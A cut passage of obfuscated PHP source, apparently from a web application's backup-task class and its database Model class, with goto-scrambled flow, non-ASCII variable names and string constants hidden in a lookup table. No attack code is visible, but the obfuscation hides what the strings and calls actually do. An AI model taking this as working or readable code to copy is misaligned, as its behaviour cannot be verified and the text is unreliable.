"\x74\151\155\x65\x54\x6f"); public function config() { goto Eë–´Ü‡; DŒ¦ºè«³‡: if (isset($BçÁÉÅğÍ[$dõ¶í“í[197]])) { $d£›çéô»Ÿ[$dõ¶í“í[197]][$dõ¶í“í[1523]] = $BçÁÉÅğÍ[$dõ¶í“í[197]]; unset($BçÁÉÅğÍ[$dõ¶í“í[197]]); } return array_merge($d£›çéô»Ÿ, $BçÁÉÅğÍ); goto cî™œ‚Åªñ; F¸ñŠØ£: $BçÁÉÅğÍ = is_array($BçÁÉÅğÍ) ? $BçÁÉÅğÍ : array(); if (!isset($BçÁÉÅğÍ[$dõ¶í“í[736]])) { $BçÁÉÅğÍ[$dõ¶í“í[736]] = $dõ¶í“í[87]; } unset($BçÁÉÅğÍ[$dõ¶í“í[1520]]); goto cäÏ·ÃÓŠ; bŸ÷–â•ƒ†: $d£›çéô»Ÿ = Model($dõ¶í“í[1745])->findByKey($dõ¶í“í[1538], $dÉŒ¡»à÷¹); if (!$d£›çéô»Ÿ) { $d£›çéô»Ÿ = array(); } if (isset($d£›çéô»Ÿ[$dõ¶í“í[197]])) { $d£›çéô»Ÿ[$dõ¶í“í[197]] = json_decode($d£›çéô»Ÿ[$dõ¶í“í[197]], !0); } goto DŒ¦ºè«³‡; cäÏ·ÃÓŠ: Action($dõ¶í“í[1743])->taskInit(); Model($dõ¶í“í[1519])->cacheClear(); $dÉŒ¡»à÷¹ = $dõ¶í“í[1744]; goto bŸ÷–â•ƒ†; Eë–´Ü‡: $dõ¶í“í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BçÁÉÅğÍ = Model($dõ¶í“í[751])->get($dõ¶í“í[763]); $BçÁÉÅğÍ = json_decode($BçÁÉÅğÍ, !0); goto F¸ñŠØ£; cî™œ‚Åªñ: } public function listData($CğÌ¦‡ã»¯ = false, $Fâ¬àÖœé´ = "\155\x6f\144\x69\x66\x79\x54\x69\155\145", $bÄ®‘÷Ô = false) { return parent::listData($CğÌ¦‡ã»¯, $Fâ¬àÖœé´, !0); } public function lastItem() { $e¥ÅäÊ‘‚Ë = $this->listData(); return !empty($e¥ÅäÊ‘‚Ë[0]) ? $e¥ÅäÊ‘‚Ë[0] : null; } public function kill($D˜¥ÀçœÊ±) { goto F÷­’Òã­; CñÖš†Ğ: Task::kill($bƒÊù×ˆ”­[762]); Task::kill($bƒÊù×ˆ”­[787]); Task::kill($bƒÊù×ˆ”­[797]); goto fìÅŸƒïÅĞ; fìÅŸƒïÅĞ: $aôÁ×¡á’ = $A‚ÈÂàÊ®[$bƒÊù×ˆ”­[28]]; $eÒöˆåàì‰ = TEMP_FILES . $bƒÊù×ˆ”­[759] . $aôÁ×¡á’ . $bƒÊù×ˆ”­[8]; IO::remove($eÒöˆåàì‰, !1); goto c¤‘“¼ß¾; c¤‘“¼ß¾: return $this->remove($D˜¥ÀçœÊ±); goto b«‡ò§äÜè; F÷­’Òã­: $bƒÊù×ˆ”­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‚ÈÂàÊ® = $this->listData($D˜¥ÀçœÊ±); if (!$A‚ÈÂàÊ® || empty($A‚ÈÂàÊ®[$bƒÊù×ˆ”­[28]])) { return !0; } goto CñÖš†Ğ; b«‡ò§äÜè: } public function remove($A–ÊšÅÂÆ‡) { $dœ  º¹˜ = $this->listData($A–ÊšÅÂÆ‡); if (!$dœ  º¹˜) { return !0; } return $this->backupRemove($dœ  º¹˜); } private function backupRemove($a‹‘Í™Ã‡) { parent::remove($a‹‘Í™Ã‡[$_SERVER[Ôğ—¤Šµˆ˜ñ£][395]]); $Dã¯”õë×¨ = $this->backupPath($a‹‘Í™Ã‡); IO::remove($Dã¯”õë×¨, !1); return !0; } private function backupPath($b¨ëÆèä—Î) { $Cªë® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b¨Š®¹½öß = $b¨ëÆèä—Î[$Cªë®[28]]; $BÔ£Í ÜÛ = Model($Cªë®[751])->get($Cªë®[752]); $A„ê¼¦ïá– = substr(md5($Cªë®[753] . $BÔ£Í ÜÛ . $b¨Š®¹½öß), 0, 8); return "\x7b\151\157\x3a{$b¨ëÆèä—Î[$Cªë®[733]]}\175\x2f\x64\141\x74\x61\x62\x61\163\145\57\x62\141\x63\153\165\x70\x2f" . $b¨Š®¹½öß . $Cªë®[71] . $A„ê¼¦ïá–; } public function start() { goto bƒ¤ÁÑËä; B‰Ò¼±ÇË: Backup::set(array($C¤ßÕôÉÉ£[731] => 1, $C¤ßÕôÉÉ£[490] => time())); return !0; goto dãø””·„”; bƒ¤ÁÑËä: $C¤ßÕôÉÉ£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($GLOBALS[$C¤ßÕôÉÉ£[6]][$C¤ßÕôÉÉ£[88]][$C¤ßÕôÉÉ£[1746]] != $C¤ßÕôÉÉ£[87]) { return !0; } $c†¹¬ïÇ = $this->config(); goto dåÑ³…–èĞ; dåÑ³…–èĞ: if (!$c†¹¬ïÇ || $c†¹¬ïÇ[$C¤ßÕôÉÉ£[1520]] != $C¤ßÕôÉÉ£[87]) { return !1; } $BÈùêÈ‡ŠØ = $this->process(); foreach ($BÈùêÈ‡ŠØ as $eœóÏ²©¢) { if ($eœóÏ²©¢) { return Task::restart($eœóÏ²©¢[$C¤ßÕôÉÉ£[395]]); } } goto FÆ·ä¹é¹; FÆ·ä¹é¹: $Cö‘Ûåç» = new Backup(); $c·œ‘¦Ç Ğ = $Cö‘Ûåç»->db(); if ($c·œ‘¦Ç Ğ) { $c·œ‘¦Ç Ğ = $Cö‘Ûåç»->dbFile(); if ($c·œ‘¦Ç Ğ && $c†¹¬ïÇ[$C¤ßÕôÉÉ£[736]] == $C¤ßÕôÉÉ£[191]) { $c·œ‘¦Ç Ğ = $Cö‘Ûåç»->file(); } } goto B‰Ò¼±ÇË; dãø””·„”: } public function process() { $C“ò‘è¿½• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($C“ò‘è¿½•[739] => Task::get($C“ò‘è¿½•[762]), $C“ò‘è¿½•[743] => Task::get($C“ò‘è¿½•[787]), $C“ò‘è¿½•[193] => Task::get($C“ò‘è¿½•[797])); } public function restore() { $f´²ŸËÑÏ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; ActionCall($f´²ŸËÑÏ‚[1040], !0, 1); ActionCall($f´²ŸËÑÏ‚[1040], !0, 0); } } goto Cí¾‡ò·×±; a„Ê×–—ß¥: define($_SERVER[Ôğ—¤Šµˆ˜ñ£][240], 0); define($_SERVER[Ôğ—¤Šµˆ˜ñ£][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\157\x72\x64\145\x72", "\x61\x6c\x69\x61\x73", "\x68\x61\x76\x69\156\x67", "\147\162\157\165\x70", "\x6c\x6f\x63\153", "\144\x69\x73\x74\x69\156\x63\x74", "\141\x75\x74\157", "\x66\x69\154\164\x65\162", "\x76\141\154\x69\144\141\x74\x65", "\x72\x65\163\x75\154\x74", "\x62\x69\x6e\144", "\164\157\x6b\145\156"); public function __construct($cå­·ÍË¤… = '', $eË®«’š¼ = '', $E¥…›×·ôæ = '') { $f‹ÅÈéÒé© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->_initialize(); if (!empty($cå­·ÍË¤…)) { if (strpos($cå­·ÍË¤…, $f‹ÅÈéÒé©[95])) { list($this->dbName, $this->name) = explode($f‹ÅÈéÒé©[95], $cå­·ÍË¤…); } else { $this->name = $cå­·ÍË¤…; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eË®«’š¼)) { $this->tablePrefix = $f‹ÅÈéÒé©[33]; } elseif ($f‹ÅÈéÒé©[33] != $eË®«’š¼) { $this->tablePrefix = $eË®«’š¼; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($f‹ÅÈéÒé©[242]); } $this->db(0, empty($this->connection) ? $E¥…›×·ôæ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $fâİø‹ì¡¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($this->fields)) { if (think_config($fâİø‹ì¡¦[243])) { $AøáÔÊñ‘Ç = $this->dbName ? $this->dbName : think_config($fâİø‹ì¡¦[244]); $F„à¹•ÙË = think_var_cache($fâİø‹ì¡¦[245] . strtolower(get_path_this($AøáÔÊñ‘Ç) . $fâİø‹ì¡¦[95] . $this->name)); if ($F„à¹•ÙË) { $A¬†îæ¥’Š = think_config($fâİø‹ì¡¦[246]); if (empty($A¬†îæ¥’Š) || $F„à¹•ÙË[$fâİø‹ì¡¦[247]] == $A¬†îæ¥’Š) { $this->fields = $F„à¹•ÙË; return; } } } $this->flush(); } } public function flush() { goto AŞ×ÑÒ¾´; eîÇˆ¾ìŠ: foreach ($C“ÍªŠŠë as $FêöÑÁôªË => $f¶ÔÙĞÌËÍ) { $d¤Şß¤‚äë[$FêöÑÁôªË] = $f¶ÔÙĞÌËÍ[$Cöä•—Éñ[29]]; if ($f¶ÔÙĞÌËÍ[$Cöä•—Éñ[36]]) { $this->fields[$Cöä•—Éñ[249]] = $FêöÑÁôªË; if ($f¶ÔÙĞÌËÍ[$Cöä•—Éñ[39]]) { $this->fields[$Cöä•—Éñ[248]] = !0; } } } $this->fields[$Cöä•—Éñ[250]] = $d¤Şß¤‚äë; if (think_config($Cöä•—Éñ[246])) { $this->fields[$Cöä•—Éñ[247]] = think_config($Cöä•—Éñ[246]); } goto BÓñìÎ‘İ†; BÓñìÎ‘İ†: if (think_config($Cöä•—Éñ[243])) { $D”Äº×æØ = $this->dbName ? $this->dbName : think_config($Cöä•—Éñ[244]); think_var_cache($Cöä•—Éñ[245] . strtolower(get_path_this($D”Äº×æØ) . $Cöä•—Éñ[95] . $this->name), $this->fields); } goto FëÎğí‰ò³; FÖè´¢Í˜è: if (!$C“ÍªŠŠë) { return !1; } $this->fields = array_keys($C“ÍªŠŠë); $this->fields[$Cöä•—Éñ[248]] = !1; goto eîÇˆ¾ìŠ; AŞ×ÑÒ¾´: $Cöä•—Éñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->db->setModel($this->name); $C“ÍªŠŠë = $this->db->getFields($this->getTableName()); goto FÖè´¢Í˜è; FëÎğí‰ò³: } public function switchModel($bŒ¶Ç¶Ì‚—, $DäˆÒäƒï = array()) { $b™ĞÄæƒ³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BğìªŠ‹« = ucwords(strtolower($bŒ¶Ç¶Ì‚—)) . $b™ĞÄæƒ³[251]; if (!class_exists($BğìªŠ‹«)) { think_exception($BğìªŠ‹« . think_lang($b™ĞÄæƒ³[252])); } $this->_extModel = new $BğìªŠ‹«($this->name); if (!empty($DäˆÒäƒï)) { foreach ($DäˆÒäƒï as $dùÓ„Å°÷) { $this->_extModel->setProperty($dùÓ„Å°÷, $this->{$dùÓ„Å°÷}); } } return $this->_extModel; } public function __set($f’ÖáÔ‹¼ò, $CíœíŒÀ©Ÿ) { $this->data[$f’ÖáÔ‹¼ò] = $CíœíŒÀ©Ÿ; } public function __get($c†’Îéù´Ö) { return isset($this->data[$c†’Îéù´Ö]) ? $this->data[$c†’Îéù´Ö] : null; } public function __isset($EÑ„æŠ¨¯İ) { return isset($this->data[$EÑ„æŠ¨¯İ]); } public function __unset($DÉĞŠ­›¸À) { unset($this->data[$DÉĞŠ­›¸À]); } public function __call($fáªäÒ®ÔÅ, $CïØã¨²„¥) { $DŠòØÜ‹âæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (in_array(strtolower($fáªäÒ®ÔÅ), $this->methods, !0)) { $this->options[strtolower($fáªäÒ®ÔÅ)] = $CïØã¨²„¥[0]; return $this; } elseif (in_array(strtolower($fáªäÒ®ÔÅ), array($DŠòØÜ‹âæ[253], $DŠòØÜ‹âæ[254], $DŠòØÜ‹âæ[255], $DŠòØÜ‹âæ[256], $DŠòØÜ‹âæ[257]), !0)) { $ašÀ–É¹‰ˆ = isset($CïØã¨²„¥[0]) ? $CïØã¨²„¥[0] : $DŠòØÜ‹âæ[182]; $ašÀ–É¹‰ˆ = $this->db->parseKey($ašÀ–É¹‰ˆ); return $this->getField(strtoupper($fáªäÒ®ÔÅ) . $DŠòØÜ‹âæ[258] . $ašÀ–É¹‰ˆ . $DŠòØÜ‹âæ[259] . $fáªäÒ®ÔÅ, $DŠòØÜ‹âæ[253]); } elseif (strtolower(substr($fáªäÒ®ÔÅ, 0, 5)) == $DŠòØÜ‹âæ[260]) { $ašÀ–É¹‰ˆ = think_parse_name(substr($fáªäÒ®ÔÅ, 5)); $c¤íê”Œ”ã[$ašÀ–É¹‰ˆ] = $CïØã¨²„¥[0]; return $this->where($c¤íê”Œ”ã)->find(); } elseif (strtolower(substr($fáªäÒ®ÔÅ, 0, 10)) == $DŠòØÜ‹âæ[261]) { $f“æçÂĞ¹Ä = think_parse_name(substr($fáªäÒ®ÔÅ, 10)); $c¤íê”Œ”ã[$f“æçÂĞ¹Ä] = $CïØã¨²„¥[0]; return $this->where($c¤íê”Œ”ã)->getField($CïØã¨²„¥[1]); } elseif (isset($this->_scope[$fáªäÒ®ÔÅ])) { return $this->scope($fáªäÒ®ÔÅ, $CïØã¨²„¥[0]); } elseif (method_exists($this, $fáªäÒ®ÔÅ)) { array_unshift($CïØã¨²„¥, $fáªäÒ®ÔÅ); return call_user_func_array(array($this, $DŠòØÜ‹âæ[262]), $CïØã¨²„¥); } else { return call_user_func_array(array(parent, $fáªäÒ®ÔÅ), $CïØã¨²„¥); } } protected function call() { goto D‹Š†ºå; D‹Š†ºå: $A‘²‡øÈëµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fá“Ù‘¨Áó = func_get_args(); $dÚÆà˜Ñô = array_shift($fá“Ù‘¨Áó); goto AÃİ„‘´µ˜; B¬ÁÑÌéæÇ: if (isset($fá“Ù‘¨Áó[$A¸ÀÊ·¿À‹]) && $fá“Ù‘¨Áó[$A¸ÀÊ·¿À‹] === $dÚÆà˜Ñô) { think_exception(__CLASS__ . $A‘²‡øÈëµ[4] . $dÚÆà˜Ñô . think_lang($A‘²‡øÈëµ[263])); return; } $fá“Ù‘¨Áó[] = $dÚÆà˜Ñô; if (method_exists($this, $A‘²‡øÈëµ[264])) { $A”‡ÑÁ÷ = call_user_func_array(array($this, $A‘²‡øÈëµ[265]), array($A½ŸİÂ»ö, $fá“Ù‘¨Áó)); if (!is_null($A”‡ÑÁ÷) && $A”‡ÑÁ÷ !== !1) { return $A”‡ÑÁ÷; } } goto Bæ¯’¾Ş…; Bæ¯’¾Ş…: $DÄ‘ßÆÜç = call_user_func_array(array($this, $dÚÆà˜Ñô), $fá“Ù‘¨Áó); if (method_exists($this, $A‘²‡øÈëµ[266])) { $A”‡ÑÁ÷ = call_user_func_array(array($this, $A‘²‡øÈëµ[267]), array($A½ŸİÂ»ö, $fá“Ù‘¨Áó, $DÄ‘ßÆÜç)); if ($A”‡ÑÁ÷) { return $A”‡ÑÁ÷; } } return $DÄ‘ßÆÜç; goto a‰£÷æçÎĞ; AÃİ„‘´µ˜: $A½ŸİÂ»ö = $dÚÆà˜Ñô; if (is_array($dÚÆà˜Ñô)) { $A½ŸİÂ»ö = $dÚÆà˜Ñô[1]; $dÚÆà˜Ñô = $dÚÆà˜Ñô[0]; } $A¸ÀÊ·¿À‹ = count($fá“Ù‘¨Áó) - 1; goto B¬ÁÑÌéæÇ; a‰£÷æçÎĞ: } protected function _initialize() { } protected function _facade($e˜ß²ˆáê) { $fô·Ûó¼Ø„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($this->fields)) { foreach ($e˜ß²ˆáê as $a¶×é„õÓ¨ => $bİ¤áğÕÊÙ) { if (is_array($this->fields) && !in_array($a¶×é„õÓ¨, $this->fields, !0)) { unset($e˜ß²ˆáê[$a¶×é„õÓ¨]); } elseif (is_scalar($bİ¤áğÕÊÙ)) { $this->_parseType($e˜ß²ˆáê, $a¶×é„õÓ¨); } } } if (!empty($this->options[$fô·Ûó¼Ø„[268]])) { $e˜ß²ˆáê = array_map($this->options[$fô·Ûó¼Ø„[268]], $e˜ß²ˆáê); unset($this->options[$fô·Ûó¼Ø„[268]]); } $this->_beforeWrite($e˜ß²ˆáê); return $e˜ß²ˆáê; } protected function _beforeWrite(&$Bé¹“³‚¯Ş) { } public function add($A»†ö¾éš– = '', $CÆù§ë›ç = array(), $aÂ‘âÃ³ë’ = false) { goto a©•˜ê„„’; a©•˜ê„„’: if (empty($A»†ö¾éš–)) { if (!empty($this->data)) { $A»†ö¾éš– = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ôğ—¤Šµˆ˜ñ£][269]); return !1; } } $CÆù§ë›ç = $this->_parseOptions($CÆù§ë›ç); $A»†ö¾éš– = $this->_facade($A»†ö¾éš–); goto a«Ì®™¨º; Dˆö÷¡¼…É: return $e®£ÌóŒ³°; goto B·Í½ÈŞ; a«Ì®™¨º: if (!1 === $this->_beforeInsert($A»†ö¾éš–, $CÆù§ë›ç)) { return !1; } $e®£ÌóŒ³° = $this->db->insert($A»†ö¾éš–, $CÆù§ë›ç, $aÂ‘âÃ³ë’); if (!1 !== $e®£ÌóŒ³°) { $AÃÕóŸœ† = $this->getLastInsID(); if ($AÃÕóŸœ†) { $A»†ö¾éš–[$this->getPk()] = $AÃÕóŸœ†; $this->_after_insert($A»†ö¾éš–, $CÆù§ë›ç); return $AÃÕóŸœ†; } $this->_after_insert($A»†ö¾éš–, $CÆù§ë›ç); } goto Dˆö÷¡¼…É; B·Í½ÈŞ: } protected function _beforeInsert(&$FãßÀê–, $b×…ÎŒ¯¦Ê) { } protected function _after_insert($b”„ÓÃ™, $b… éŒùÙ) { } public function addAll($f’çóöñÌÕ, $câ¿—İŒ— = array(), $b… ¶•¥— = false) { goto Aù·¹¿×™÷; F®„Éù‹: return $DÁ­«áÎĞ»; goto fÕ©÷íŒ†; Aù·¹¿×™÷: $dŒ¡¤Ã‰ŒÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($f’çóöñÌÕ)) { $this->error = think_lang($dŒ¡¤Ã‰ŒÎ[269]); return !1; } $câ¿—İŒ— = $this->_parseOptions($câ¿—İŒ—); goto cì³á´˜¶Ú; cì³á´˜¶Ú: foreach ($f’çóöñÌÕ as $Cù×àáêù => $Fé‹Ä‹î•) { $f’çóöñÌÕ[$Cù×àáêù] = $this->_facade($Fé‹Ä‹î•); } if (method_exists($this->db, $dŒ¡¤Ã‰ŒÎ[270])) { $DÁ­«áÎĞ» = $this->db->insertAll($f’çóöñÌÕ, $câ¿—İŒ—, $b… ¶•¥—); } else { $this->startTrans(); foreach ($f’çóöñÌÕ as $Cù×àáêù => $Fé‹Ä‹î•) { $DÁ­«áÎĞ» = $this->db->insert($Fé‹Ä‹î•, $câ¿—İŒ—, $b… ¶•¥—); } $this->commit(); } if (!1 !== $DÁ­«áÎĞ») { $C£ºº½ó‰ß = $this->getLastInsID(); if ($C£ºº½ó‰ß) { return $C£ºº½ó‰ß; } } goto F®„Éù‹; fÕ©÷íŒ†: } public function selectAdd($eÒÏÅ¡ºùŠ = '', $A›Ş™É°Ô´ = '', $f¡œ”õòæà = array()) { $Cù‰©¾ï™„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¡œ”õòæà = $this->_parseOptions($f¡œ”õòæà); if (!1 === ($A¥²…×í÷½ = $this->db->selectInsert($eÒÏÅ¡ºùŠ ? $eÒÏÅ¡ºùŠ : $f¡œ”õòæà[$Cù‰©¾ï™„[271]], $A›Ş™É°Ô´ ? $A›Ş™É°Ô´ : $this->getTableName(), $f¡œ”õòæà))) { $this->error = think_lang($Cù‰©¾ï™„[272]); return !1; } else { return $A¥²…×í÷½; } } public function save($c¯ÖÙÌ„ä¸ = '', $BãŒ×·” = array()) { goto dÆ¹Ü¿Ø¿‘; FåâÎªäãñ: if (!1 !== $BÕ«îÃ†²Ş) { if (isset($F˜§¨Ã…Úó)) { $c¯ÖÙÌ„ä¸[$EÇå–áâ¦Ş] = $F˜§¨Ã…Úó; } $this->_afterUpdate($c¯ÖÙÌ„ä¸, $BãŒ×·”); } return $BÕ«îÃ†²Ş; goto b¿îëÀÃù; dÆ¹Ü¿Ø¿‘: $Fá­¸ó‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($c¯ÖÙÌ„ä¸)) { if (!empty($this->data)) { $c¯ÖÙÌ„ä¸ = $this->data; $this->data = array(); } else { $this->error = think_lang($Fá­¸ó‚[269]); return !1; } } $c¯ÖÙÌ„ä¸ = $this->_facade($c¯ÖÙÌ„ä¸); goto càã×Ûåê; càã×Ûåê: $BãŒ×·” = $this->_parseOptions($BãŒ×·”); $EÇå–áâ¦Ş = $this->getPk(); if (!isset($BãŒ×·”[$Fá­¸ó‚[273]])) { if (isset($c¯ÖÙÌ„ä¸[$EÇå–áâ¦Ş])) { $eò¨òÜ°ê[$EÇå–áâ¦Ş] = $c¯ÖÙÌ„ä¸[$EÇå–áâ¦Ş]; $BãŒ×·”[$Fá­¸ó‚[273]] = $eò¨òÜ°ê; unset($c¯ÖÙÌ„ä¸[$EÇå–áâ¦Ş]); } else { $this->error = think_lang($Fá­¸ó‚[272]); return !1; } } goto a´Ì‚Ú—ŞÜ; a´Ì‚Ú—ŞÜ: if (is_array($BãŒ×·”[$Fá­¸ó‚[273]]) && isset($BãŒ×·”[$Fá­¸ó‚[273]][$EÇå–áâ¦Ş])) { $F˜§¨Ã…Úó = $BãŒ×·”[$Fá­¸ó‚[273]][$EÇå–áâ¦Ş]; } if (!1 === $this->_beforeUpdate($c¯ÖÙÌ„ä¸, $BãŒ×·”)) { return !1; } $BÕ«îÃ†²Ş = $this->db->update($c¯ÖÙÌ„ä¸, $BãŒ×·”); goto FåâÎªäãñ; b¿îëÀÃù: } protected function _beforeUpdate(&$fœ·Œ×çŠ, $cîÜÌÆÑµ«) { } protected function _afterUpdate($A®ÅÖ×ÓÆ, $EÀˆÌ³­‡) { } public function delete($e½Î™ó§Î = array()) { goto B¶¥‰Ùµß«; Dñë«»Ú—³: if (is_numeric($e½Î™ó§Î) || is_string($e½Î™ó§Î)) { if (strpos($e½Î™ó§Î, $fÉÅµ®£Ä[47])) { $bí½µÀØÒÜ[$FÇ“—Àºå] = array($fÉÅµ®£Ä[274], $e½Î™ó§Î); } else { $bí½µÀØÒÜ[$FÇ“—Àºå] = $e½Î™ó§Î; } $this->options[$fÉÅµ®£Ä[273]] = $bí½µÀØÒÜ; } $e½Î™ó§Î = $this->_parseOptions(); if (is_array($e½Î™ó§Î[$fÉÅµ®£Ä[273]]) && isset($e½Î™ó§Î[$fÉÅµ®£Ä[273]][$FÇ“—Àºå])) { $E–ÊÂ™Å† = $e½Î™ó§Î[$fÉÅµ®£Ä[273]][$FÇ“—Àºå]; } goto f®åÍæÈ ; B¶¥‰Ùµß«: $fÉÅµ®£Ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($e½Î™ó§Î) && empty($this->options[$fÉÅµ®£Ä[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $FÇ“—Àºå = $this->getPk(); goto Dñë«»Ú—³; f®åÍæÈ : $d’ò‰ÜÊÕí = $this->db->delete($e½Î™ó§Î); if (!1 !== $d’ò‰ÜÊÕí) { $EÔˆÒ¨Ğ = array(); if (isset($E–ÊÂ™Å†)) { $EÔˆÒ¨Ğ[$FÇ“—Àºå] = $E–ÊÂ™Å†; } $this->_after_delete($EÔˆÒ¨Ğ, $e½Î™ó§Î); } return $d’ò‰ÜÊÕí; goto Eê«Â¦¯¥š; Eê«Â¦¯¥š: } protected function _after_delete($D´¼ŠµÆ›¾, $dñ™â‰Š) { } public function select($FÆé¨‡ÎŞö = array()) { goto Aº±ôŠÂÍ; Aº±ôŠÂÍ: $dÜ ˆìˆ™‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_string($FÆé¨‡ÎŞö) || is_numeric($FÆé¨‡ÎŞö)) { $bÄ­Ğ­öŒ = $this->getPk(); if (strpos($FÆé¨‡ÎŞö, $dÜ ˆìˆ™‹[47])) { $e¾í³…‘Ç[$bÄ­Ğ­öŒ] = array($dÜ ˆìˆ™‹[274], $FÆé¨‡ÎŞö); } else { $e¾í³…‘Ç[$bÄ­Ğ­öŒ] = $FÆé¨‡ÎŞö; } $this->options[$dÜ ˆìˆ™‹[273]] = $e¾í³…‘Ç; } elseif (!1 === $FÆé¨‡ÎŞö) { $FÆé¨‡ÎŞö = $this->_parseOptions(); return $dÜ ˆìˆ™‹[275] . $this->db->buildSelectSql($FÆé¨‡ÎŞö) . $dÜ ˆìˆ™‹[276]; } $FÆé¨‡ÎŞö = $this->_parseOptions(); goto Fª†‹ø‡–; F¢ğİöíÕƒ: $this->_afterSelect($d„¬é±ïäğ, $FÆé¨‡ÎŞö); return $d„¬é±ïäğ; goto cØÖôƒ Ûæ; Fª†‹ø‡–: $d„¬é±ïäğ = $this->db->select($FÆé¨‡ÎŞö); if (!1 === $d„¬é±ïäğ) { return !1; } if (empty($d„¬é±ïäğ)) { return null; } goto F¢ğİöíÕƒ; cØÖôƒ Ûæ: } protected function _afterSelect(&$a¼¹«ÃõŠã, $FÏæ‰Á†á£) { } public function buildSql($eØÑ¦Ìä‘ = array()) { $EîæÏÛÀ–› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eØÑ¦Ìä‘ = $this->_parseOptions($eØÑ¦Ìä‘); return $EîæÏÛÀ–›[275] . $this->db->buildSelectSql($eØÑ¦Ìä‘) . $EîæÏÛÀ–›[276]; } public function optionsValue($b×©œŞ´Â“ = null) { if (is_null($b×©œŞ´Â“)) { return $this->options; } elseif (is_array($b×©œŞ´Â“)) { $this->options = array_merge($this->options, $b×©œŞ´Â“); } } protected function _parseOptions($bÓâ…äÍô = array()) { goto E ±”Ì‘íù; FÉ¿¨’‰ŠŒ: if (!isset($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[277]])) { $bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[277]] = $this->getTableName(); $B±‰‘‚—š‡ = $this->fields; } else { $B±‰‘‚—š‡ = $this->getDbFields(); } if (!empty($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[278]])) { $bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[277]] .= $C”¢Ÿ¬ÚºÎ[50] . $bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[278]]; } $bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[279]] = $this->name; goto E±ÍĞĞÑ²š; E ±”Ì‘íù: $C”¢Ÿ¬ÚºÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($bÓâ…äÍô)) { $bÓâ…äÍô = array_merge($this->options, $bÓâ…äÍô); } $this->options = array(); goto FÉ¿¨’‰ŠŒ; E±ÍĞĞÑ²š: if (isset($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[273]]) && is_array($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[273]]) && !empty($B±‰‘‚—š‡) && !isset($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[280]]) && !isset($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[277]])) { foreach ($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[273]] as $f§àñ ¦º => $F¦ÛÍë‹¨‹) { $f§àñ ¦º = trim($f§àñ ¦º); if (in_array($f§àñ ¦º, $B±‰‘‚—š‡, !0)) { if (is_scalar($F¦ÛÍë‹¨‹)) { $this->_parseType($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[273]], $f§àñ ¦º); } } elseif (!is_numeric($f§àñ ¦º) && $C”¢Ÿ¬ÚºÎ[71] != substr($f§àñ ¦º, 0, 1) && !1 === strpos($f§àñ ¦º, $C”¢Ÿ¬ÚºÎ[95]) && !1 === strpos($f§àñ ¦º, $C”¢Ÿ¬ÚºÎ[258]) && !1 === strpos($f§àñ ¦º, $C”¢Ÿ¬ÚºÎ[281]) && !1 === strpos($f§àñ ¦º, $C”¢Ÿ¬ÚºÎ[282])) { unset($bÓâ…äÍô[$C”¢Ÿ¬ÚºÎ[273]][$f§àñ ¦º]); } } } $this->_options_filter($bÓâ…äÍô); return $bÓâ…äÍô; goto d»‰¹©®©İ; d»‰¹©®©İ: } protected function _options_filter(&$Bè½‹ÜÂ×) { } protected function _parseType(&$cõŒšï ìã, $e ¹”Ù˜”õ) { $FŞŒ±ÒâÅó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($this->options[$FŞŒ±ÒâÅó[283]][$FŞŒ±ÒâÅó[4] . $e ¹”Ù˜”õ])) { $f¡¾ëª¡¢ = strtolower($this->fields[$FŞŒ±ÒâÅó[250]][$e ¹”Ù˜”õ]); if (!1 !== strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[284])) { } elseif (!1 === strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[285]) && !1 !== strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[286])) { $cõŒšï ìã[$e ¹”Ù˜”õ] = intval($cõŒšï ìã[$e ¹”Ù˜”õ]); } elseif (!1 !== 